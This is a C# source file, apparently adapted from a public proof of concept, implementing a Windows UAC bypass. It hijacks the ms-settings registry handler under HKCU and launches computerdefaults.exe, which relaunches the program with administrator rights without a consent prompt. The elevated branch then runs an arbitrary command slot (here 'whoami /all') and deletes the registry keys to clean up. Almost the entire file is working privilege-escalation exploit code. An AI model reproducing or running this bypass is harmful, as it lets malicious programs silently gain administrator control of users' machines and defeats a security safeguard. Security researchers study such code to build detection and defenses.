// Based on https://github.com/0xyg3n/UAC_Exploit/blob/main/UAC_Bypass_POC/Program.cs

using System;
using Microsoft.Win32;
using System.Diagnostics;
using System.Management;
using System.Security.Principal;

namespace UAC_UP
{
    public class Program
    {
        public static void UAC()
        {
            WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
            if (!windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator))
            {
                Reg("Classes");
                Reg("Classes\\ms-settings");
                Reg("Classes\\ms-settings\\shell");
                Reg("Classes\\ms-settings\\shell\\open");
                RegistryKey registryKey = Reg("Classes\\ms-settings\\shell\\open\\command");
                string cpath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                registryKey.SetValue("", cpath, RegistryValueKind.String);
                registryKey.SetValue("DelegateExecute", 0, RegistryValueKind.DWord);
                registryKey.Close();
                try
                {
                    Process.Start(new ProcessStartInfo
                    {
                        CreateNoWindow = true,
                        UseShellExecute = false,
                        FileName = "cmd.exe",
                        Arguments = "/c start computerdefaults.exe"
                    });
                }
                catch { }
                Process.GetCurrentProcess().Kill();
            }
            else
            {
                RegistryKey registryKey2 = Reg("Classes\\ms-settings\\shell\\open\\command");
                registryKey2.SetValue("", "", RegistryValueKind.String);
            }
        }

        public static RegistryKey Reg(string x)
        {
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\" + x, true);
            bool flag = !Program.checksubkey(registryKey);
            if (flag)
            {
                registryKey = Registry.CurrentUser.CreateSubKey("Software\\" + x);
            }
            return registryKey;
        }

        public static bool checksubkey(RegistryKey k)
        {
            bool flag = k == null;
            return !flag;
        }

        private static ManagementObject GetMngObj(string className)
        {
            ManagementClass managementClass = new ManagementClass(className);
            try
            {
                foreach (ManagementBaseObject managementBaseObject in managementClass.GetInstances())
                {
                    ManagementObject managementObject = (ManagementObject)managementBaseObject;
                    bool flag = managementObject != null;
                    if (flag)
                    {
                        return managementObject;
                    }
                }
            }
            catch { }
            return null;
        }

        public static string GetOsVer()
        {
            string result;
            try
            {
                ManagementObject mngObj = Program.GetMngObj("Win32_OperatingSystem");
                bool flag = mngObj == null;
                if (flag)
                {
                    result = string.Empty;
                }
                else
                {
                    result = (mngObj["Version"] as string);
                }
            }
            catch (Exception ex)
            {
                result = string.Empty;
            }
            return result;
        }
    }

    static class Main_Class
    {
        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main()
        {
            try
            {
                if (!IsAdministrator())
                {
                    Program.UAC();

                }
                else if (IsAdministrator())
                {

                    string Execution = "powershell.exe -NoExit -c whoami /all"; // Execute what
                    Process.Start("CMD.exe", "/c start " + Execution);
                    RegistryKey uac_clean = Registry.CurrentUser.OpenSubKey("Software\\Classes\\ms-settings", true);
                    uac_clean.DeleteSubKeyTree("shell"); //deleting this is important because if we won't delete that right click of windows will break.
                    uac_clean.Close();
                }

            }
            catch { Environment.Exit(0); }
        }

    }
}
